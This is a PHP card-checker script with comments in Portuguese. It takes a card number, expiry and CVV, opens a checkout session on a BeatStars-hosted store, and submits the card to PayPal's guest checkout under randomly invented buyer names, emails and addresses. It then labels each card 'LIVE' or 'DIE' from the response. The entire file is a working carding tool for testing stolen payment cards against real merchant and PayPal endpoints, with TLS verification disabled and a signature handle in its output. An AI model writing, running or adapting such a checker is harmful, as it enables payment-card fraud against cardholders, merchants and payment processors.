<?php
header('Content-Type: text/plain');

if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    echo "Parâmetro 'lista' é obrigatório";
    exit;
}

$lista = $_GET['lista'];

function fazerRequest($url, $headers, $data = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    if ($data !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        $headers[] = 'Content-Type: application/json';
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['code' => $httpCode, 'body' => $response];
}

function processarPagamento($lista) {
    $dados = explode('|', $lista);
    if (count($dados) != 4) {
        return "DIE » {$lista} » INVALID_FORMAT » @WSLZIMMOSILVA";
    }
    
    list($cartao, $mes, $ano, $cvv) = $dados;
    
    if (substr($cartao, 0, 1) == '4') {
        $tipo = "VISA";
        $cvv_len = 3;
    } elseif (substr($cartao, 0, 1) == '5') {
        $tipo = "MASTER_CARD";
        $cvv_len = 3;
    } elseif (substr($cartao, 0, 1) == '3') {
        $tipo = "AMEX";
        $cvv_len = 4;
    } else {
        return "DIE » {$lista} » INVALID_CARD_TYPE » @WSLZIMMOSILVA";
    }
    
    if (strlen($cvv) != $cvv_len) {
        return "DIE » {$lista} » INVALID_CVV_LENGTH » @WSLZIMMOSILVA";
    }
    

    $uuid1 = uniqid();
    $headers1 = [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept: application/json, text/plain, */*',
        'uuid: ' . $uuid1,
        'app: PROPAGE',
        'x-beatstars-store-id: MR179858',
        'version: 2.3.774',
        'referer: https://caliberbeats.store/'
    ];
    
    $payload1 = [
        'query' => 'query paymentSession($id: String!) { payment(id: $id) { paypalMultiPartyCheckout { orderId } } }',
        'variables' => ['id' => 'PSGTe1d0b812-7237-f567-42d2-ff9311090111NCnlMhKfahZW']
    ];
    
    $result1 = fazerRequest('https://core.prod.beatstars.net/graphql?op=getPaymentSession', $headers1, $payload1);
    
    if ($result1['code'] != 200) {
        return "DIE » {$lista} » no checked » @WSLZIMMOSILVA";
    }
    
    sleep(1);
    

    $uuid2 = uniqid();
    $headers2 = [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept: application/json, text/plain, */*',
        'uuid: ' . $uuid2,
        'app: PROPAGE',
        'x-beatstars-store-id: MR179858',
        'version: 2.3.774',
        'referer: https://caliberbeats.store/'
    ];
    
    $payload2 = [
        'query' => 'mutation preparePaymentSession($payment: PaymentInput!) { paymentCheckout(payment: $payment) { paypalMultiPartyCheckout { orderId } } }',
        'variables' => [
            'payment' => [
                'id' => 'PSGTe1d0b812-7237-f567-42d2-ff9311090111NCnlMhKfahZW',
                'callbackUrl' => 'https://caliberbeats.store/checkout/finalize',
                'channel' => 'WEB',
                'useWallet' => false,
                'v2SessionId' => $uuid2,
                'paypalMultiPartyCheckout' => ['step' => 'CREATE_ORDER']
            ]
        ]
    ];
    
    $result2 = fazerRequest('https://core.prod.beatstars.net/graphql?op=preparePaymentSession', $headers2, $payload2);
    
    if ($result2['code'] != 200) {
        return "DIE » {$lista} » no checked » @WSLZIMMOSILVA";
    }
    
    $data2 = json_decode($result2['body'], true);
    $orderId = $data2['data']['paymentCheckout']['paypalMultiPartyCheckout']['orderId'] ?? null;
    
    if (!$orderId) {
        return "DIE » {$lista} » NO_ORDER_ID » @WSLZIMMOSILVA";
    }
    
    sleep(1);
    
    // PAYPAL
    $paypalId = 'BR' . rand(100000, 999999) . 'GL' . rand(10000000, 99999999);
    $headers3 = [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Content-Type: application/json',
        'paypal-client-context: ' . $paypalId,
        'x-app-name: standardcardfields',
        'paypal-client-metadata-id: ' . $paypalId,
        'x-country: US',
        'origin: https://www.paypal.com'
    ];
    
    $nomes = ['Maria', 'Ana', 'Sophia', 'Julia'];
    $sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza'];
    $nome = strtolower($nomes[array_rand($nomes)]);
    $sobrenome = strtolower($sobrenomes[array_rand($sobrenomes)]);
    
    $payload3 = [
        'query' => 'mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) { approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } } } }',
        'variables' => [
            'token' => $orderId,
            'card' => [
                'cardNumber' => $cartao,
                'type' => $tipo,
                'expirationDate' => sprintf('%02d', $mes) . '/' . $ano,
                'postalCode' => '10081',
                'securityCode' => $cvv
            ],
            'phoneNumber' => '21' . rand(70000000, 99999999),
            'firstName' => $nome,
            'lastName' => $sobrenome,
            'email' => $nome . '.' . $sobrenome . rand(100, 999) . '@gmail.com',
            'billingAddress' => [
                'givenName' => $nome,
                'familyName' => $sobrenome,
                'line1' => 'Street ' . rand(100, 999),
                'line2' => 'Apt ' . rand(1, 99),
                'city' => 'New York',
                'state' => 'NY',
                'postalCode' => '10081',
                'country' => 'US'
            ],
            'currencyConversionType' => 'VENDOR'
        ],
        'operationName' => null
    ];
    
    // ... (restante do código acima permanece igual)

    $result3 = fazerRequest('https://www.paypal.com/graphql?fetch_credit_form_submit', $headers3, $payload3);
    
    // Armazenamos a resposta bruta para usar no mb_strimwidth
    $responseRaw = $result3['body']; 

    if ($result3['code'] != 200) {
        return "DIE » {$lista} » PAYPAL_REQUEST_FAIL » @WSLZIMMOSILVA";
    }
    
    $data3 = json_decode($responseRaw, true);
    $codigo = 'UNKNOWN_RESPONSE';
    
    // Lógica de verificação de status (simplificada para o exemplo)
    if (isset($data3['errors'])) {
        $error = $data3['errors'][0];
        $codigo = $error['data'][0]['code'] ?? ($error['message'] ?? 'UNKNOWN_ERROR');
    } elseif (isset($data3['data']['approveGuestPaymentWithCreditCard'])) {
        $paymentData = $data3['data']['approveGuestPaymentWithCreditCard'];
        if (!empty($paymentData['flags']['is3DSecureRequired'])) {
            $codigo = 'APPROVED_3DS';
        } else {
            $codigo = 'APPROVED';
        }
    }

    $lives = $status_codes = [
    'APPROVED_3DS', 
    'APPROVED', 
    'APPROVED_NO_AUTH', 
    'SUCCESS',
    'EXISTING_ACCOUNT_RESTRICTED', 
    'INVALID_BILLING_ADDRESS', 
    'RISK_DISALLOWED', 
    'INVALID_SECURITY_CODE', // Ensure this comma is here
    'LOGIN_ERROR',           // This is where the error triggered
    'is3DSecureRequired'     // Comma here is optional but good practice
];


    // Cores para Terminal (Remova se for usar apenas no Navegador)
    $green = "\033[32m";
    $red   = "\033[31m";
    $reset = "\033[0m";

    $status = in_array($codigo, $lives) ? "{$green}✅ LIVE (Aprovada){$reset}" : "{$red}❌ DIE (Reprovada){$reset}";

    // --- Retorno com a sua modificação ---
    $retorno_msg = "💳 CARD: {$lista}\n";
    $retorno_msg .= "📊 STATUS : {$status}\n";
    $retorno_msg .= "📝 RETORNO: " . mb_strimwidth($responseRaw, 0, 150, "...") . "\n";
    $retorno_msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

    return $retorno_msg;
}

echo processarPagamento($lista);
